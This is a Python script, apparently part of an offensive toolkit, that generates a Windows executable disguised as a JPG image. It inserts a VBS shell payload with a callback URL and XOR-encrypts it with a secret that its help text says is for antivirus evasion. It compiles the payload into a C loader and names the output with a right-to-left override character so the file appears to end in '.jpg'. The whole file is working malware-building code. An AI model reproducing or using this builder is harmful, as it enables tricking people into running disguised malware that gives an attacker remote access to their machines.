import argparse
import os, subprocess
import pathlib
import time
parser = argparse.ArgumentParser(
                    prog='generate.py',
                    description='Generate a bait executable, disguised as jpg',
                    usage='generate.py -p jpgshell.vbs -a CALLBACK_URL=http://localhost:80/ JPG_URL=https://cdn.pixabay.com/photo/2024/02/26/19/39/monochrome-image-8598798_640.jpg JPG_OUTPUT_NAME=a.jpg -o myfilename -s **[]!?')
parser.add_argument("-o", "--out", help="Output jpg file name (without extension)")
parser.add_argument("-p", "--payload", help="Payload to use")
parser.add_argument("-a", "--arguments", nargs="*", help="Payload arguments")
parser.add_argument("-s", "--secret", help="Secret to encrypt payload (AV evasion)")

def main():
    args = parser.parse_args()
    
    p = pathlib.Path(__file__).parent.resolve()
    payload_args_dict = generate_payload_args_dict(args.arguments)
    c_file = create_payload(p, args.payload, payload_args_dict, args.secret)
    compile(p, c_file, args.out)

def generate_payload_args_dict(arguments: list):
    result = {}
    for a in arguments:
        splitted = a.split("=")
        result[splitted[0]]=splitted[1]
    return result

def create_payload(p:pathlib.Path, payload: str, arguments: dict, secret: str):
    with open(f"{p}\\..\\payloads\\{payload}", 'r') as f:
        vbs_script = f.read()
        vbs_script = replace_args(vbs_script, arguments)
        
        encrypted_payload = get_encrypted_payload(vbs_script, secret)
        print(encrypted_payload)
        temp_file_name = get_temp_name()
        create_temp_c_file(p, encrypted_payload, secret, temp_file_name)
    return temp_file_name

def get_encrypted_payload(script: str, secret: str):
    result = "{"
    for i in range(len(script)):
        xored = ord(script[i]) ^ ord(secret[i % len(secret)])
        result += f"{str(xored+1)},"
    result += "0}"
    return result


def create_temp_c_file(p: pathlib.Path, payload: str, secret: str, temp_file_name: str):
    with open(f"{p}\\..\\src\\runscript.c",'r') as f:
        c_file_content = f.read()
        splitted = c_file_content.split("//SCRIPT COMES HERE")
        new_content = f"\nchar sc[] = {payload};\nchar s[] = \"{secret}\";\n".join(splitted)
    with open(f"{p}\\..\\build\\{temp_file_name}",'w') as f:
        print(new_content)
        f.write(new_content)

def replace_args(script: str, arguments: dict):
    for k,v in arguments.items():
        script = script.replace(f"%{k}%",v)
    return script

def get_temp_name():
    return f"temp_{int(time.time())}.c"
    
def compile(p: pathlib.Path, c_temp_file: str, output_jpg_name: str):
    process = subprocess.Popen(f'C:\\"Program Files (x86)"\\"Microsoft Visual Studio"\\2022\\BuildTools\\Common7\\Tools\\VsDevCmd.bat && windres ..\\resources\\resources.rc -O coff --target pe-i386 -o ..\\resources\\resources.res && cl ..\\build\\{c_temp_file} ..\\resources\\resources.res /DEBUG:NONE /link /subsystem:windows /entry:mainCRTStartup /out:\"{p}\\..\\build\\{output_jpg_name}‮gpj.exe\"', shell=True, env=os.environ, cwd=f'{p}\\..\\src')
    process.wait()
    os.remove(f"{p}\\..\\build\\{c_temp_file}")
    temp_obj_file = c_temp_file.split(".")[0] + ".obj"
    os.remove(f"{p}\\..\\src\\{temp_obj_file}")

if __name__ == "__main__":
    main()